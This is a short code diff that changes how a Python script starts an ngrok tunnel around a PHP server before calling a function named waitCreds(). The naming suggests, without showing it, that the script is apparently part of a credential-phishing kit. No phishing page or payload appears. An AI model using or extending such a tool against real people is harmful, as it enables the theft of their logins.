@@ -50,9 +50,10 @@ if __name__ == "__main__":
         system('pkill -f php')
         pre()
         main()
-        runNgrok()
-        Process(target=runServer).start()
-        waitCreds()
+        with ngrok_start() as ngrok:
+            #runNgrok()
+            Process(target=runServer).start()
+            waitCreds()
     except KeyboardInterrupt:
         system('pkill -f ngrok')
         system('pkill -f php')
